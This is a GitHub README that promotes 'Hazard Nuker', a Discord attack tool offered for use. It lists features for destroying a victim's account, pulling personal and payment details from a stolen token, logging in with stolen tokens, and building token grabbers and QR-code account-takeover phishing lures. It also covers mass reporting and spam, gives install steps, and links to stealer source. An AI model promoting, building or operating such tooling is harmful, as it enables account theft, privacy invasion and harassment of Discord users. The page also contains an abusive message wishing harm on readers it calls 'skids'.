<p align= center</p><a href="https://cheataway.com" target="_blank"><img src="https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Nuker/Hazard_Nuker_Banner.png" alt="HazardNuker"></a>
<p align="center">
<img src="https://img.shields.io/github/languages/top/Rdimo/Hazard-Nuker?style=flat-square" </a>
<img src="https://img.shields.io/github/last-commit/Rdimo/Hazard-Nuker?style=flat-square" </a>
<img src="https://sonarcloud.io/api/project_badges/measure?project=Rdimo_Hazard-Nuker&metric=ncloc" </a>
<img src="https://img.shields.io/github/license/Rdimo/Hazard-Nuker?style=flat-square" </a>
<img src="https://img.shields.io/github/downloads/Rdimo/Hazard-Nuker/total?color=%23daff00&label=1.4.7 Downloads&style=flat-square" </a>
<img src="https://img.shields.io/github/stars/Rdimo/Hazard-Nuker?color=%23daff00&label=Stars&style=flat-square" </a>
<img src="https://img.shields.io/github/forks/Rdimo/Hazard-Nuker?color=%23daff00&label=Forks&style=flat-square" </a>
</p>
<p align="center">
<a href="https://github.com/Rdimo/Hazard-Nuker#installation">Installation</a> |
<a href="https://github.com/Rdimo/Hazard-Nuker#Important">Important</a> |
<a href="https://github.com/Rdimo/Hazard-Nuker/blob/master/Changelog.md">Changelogs</a> |
<a href="https://cheataway.com">Discord</a>
</p>

---

**NOTE:** Hazard is not finished! You can expect bugs, crashes, and non-working functions. Please make an issue if you find a bug!
ㅤ
#### Hazard Nuker was made with
Love ❌ <br>
Code ✅

<h1 allign="center">- Features -</h1>
<p align="center">
 <img alt="theme1" src="https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Nuker/theme1.png" width="20%">
 <img alt="theme2" src="https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Nuker/theme2.png" width="20%">
 <img alt="theme3" src="https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Nuker/theme3.png" width="20%">
 <img alt="theme4" src="https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Nuker/theme4.png" width="20%">
</p>

* ` Settings (Change the Color Theme, Thread Amount, Hotkeys and more!)`
* ` Both Compact and Feature-Rich`
* ` QoL Features such as Auto-Update, proxy scraping and more!`
* ` Easy to use!`
* ` Fast and Efficient (Low Performance Impact)`
* ` Linux Support! (Expect Bugs)`
* ` Create a token logger or QR code stealer!`
* ` Nuke an account!`
* ` Change an accounts Status, Bio, or HypeSquad house!`
* ` Mass DM using an account!`
* ` Log into an account with an isolated browser!`
* ` Mass Report a user or server!`
* ` Group Chat Spam!`
* ` Webhook Nuker/Deleter`
* ` And much, much more!`

<p align="center">
 <img alt="HazardNuker" src="https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Nuker/HazardNuker.png" width="45%">
&nbsp; &nbsp; &nbsp; &nbsp;
 <img alt="HazardNukerUpdate" src="https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Nuker/HazardUpdate.png" width="45%">
</p>

## Features in detail

<details>
<summary>All features in detail! (Drop Down)</summary>

#### [1] Nuke a targetted account 
* Basically all account nuker-based options
* Uses **Everything**! (Mass DM, Create & Delete Servers, Change Language and Theme)
* It will remove all their friends and DMs as well
* Basically, it will shit on their account.
* Everything is logged in the command window, so you can see it all happening in real time

#### [2] Unfriend all friends
* Removes all friends from the victim

#### [3] Delete and leave all servers
* Leaves/Deletes any servers a user is in

#### [4] Spam Create New servers
* Creates 100 servers! 
* Can choose a server icon aswell as a name or have it pick a random one.

#### [5] DM Deleter
* Closes/Deletes all DMs with other users! (Will also leave group chats)

#### [6] Mass DM
* Message all friends of a user with a custom message!

#### [7] Enable seizure mode
* Switches between Light & Dark mode every second or so!
* Also cycles through all the languages.

#### [8] Get information from a targetted account
Returns a lot of user info based on a token!
* Username, Discriminator, Creation Date and other user info!
* Their personal info (such as Language, Creation Date, Email and more!)
* Their avatar URL, 2FA status, Nitro Info (Type & Days left, if they have Nitro)
* Payment method, and basic info about it (Address, Number, Payment Status, PayPal info if they use that)
* Geolocational Info, such as their Country, Region, City and more!
* And all the other info you could think of!

#### [9] Log into an account
* Log into a users account with their token!
* Supports Chrome, Edge, and Opera!

#### [10] Block Friends
* Blocks all their friends

#### [11] Profile Changer
* Allows you to modify their Status, Bio, and Hypequad Badge.

#### [12] COMING SOON!
<img alt="HazardNukerSneakPeek" src="https://user-images.githubusercontent.com/80375661/159819747-52ebb340-6350-4639-a6e1-abfdfd1f80a0.png" width="65%">

#### [13] Create Token Grabber
Creates a token logger based off the **Hazard Stealer V2!**
(You can find a link to the source code [here](https://github.com/Rdimo/Hazard-Token-Grabber-V2))

<p align="left"><img src="https://user-images.githubusercontent.com/80375661/159514536-d8249923-adbe-4b9e-a187-6b028941f4a7.png"</p>

#### [14] QR Code Grabber
Creates a QR code! If someone scans the QR code, you can gain access to their account!
> The webhook notification looks like this:

<p align="left"><img src="https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Nuker/QR-code.jpg"</p>

#### [15] Mass Report
* Reports a user until you stop it.

#### [16] GroupChat Spammer
* Create a bunch of GCs with a specified user or random ones.

#### [17] Webhook Destroyer
* Spam & Delete any valid webhook!

#### [18] Settings
Change the following:
* Theme
* Threads
* Hotkeys
* Exit
</details>

---

### ❗ Important
* Found a bug? Join the [Discord](https://cheataway.com) and contact me (Rdimo) or create an issue about it directly in [here!](https://github.com/Rdimo/Hazard-Nuker/issues/new/choose)
> **WARNING:** Many people have been selling/distributing infected versions of Hazard Nuker.
> **DO NOT** install Hazard Nuker from any place other than this page. If you install it from somewhere else, expect to be **Hacked/Scammed.**

## 🤓 Dear Skids
**Good for you,** you decided to skid something. <br>
We can't stop you, but just know you're pathetic. <br>
<br>
I hope you end up on the streets begging for spare change.

## Installation 

#### Compiled Version (Easier but more buggy)
```sh-session
Visit: https://github.com/Rdimo/Hazard-Nuker/releases
Download the latest release (Hazard.zip) and extract the EXE to your desktop.
Finally, run the executable and enjoy!
```

#### Source Code Version (More complicated but less buggy)
```sh-session
Click the green "Code" button.
Click "Download ZIP"
Extract the ZIP to a folder.

Run setup.bat, which will install all dependencies and open the script.
After that, every time you'd like to use Hazard, simply open start.bat

NOTE: Make sure you have Python 3.9.5 or above installed from python.org (NOT MICROSOFT) & added to path.
```

---

🌟 **Enjoyed Hazard Nuker?** Consider dropping a star :)

<a href="https://cheataway.com" target="_blank"><img src="https://discordapp.com/api/guilds/942426336348233799/widget.png?style=banner2" alt="Cheataway"/></a>

**Hazard Stealer was created by Rdimo & DeKrypt.**

Discord: Rdimo#6969 | DeKrypt#7777

Website: https://cheataway.com/
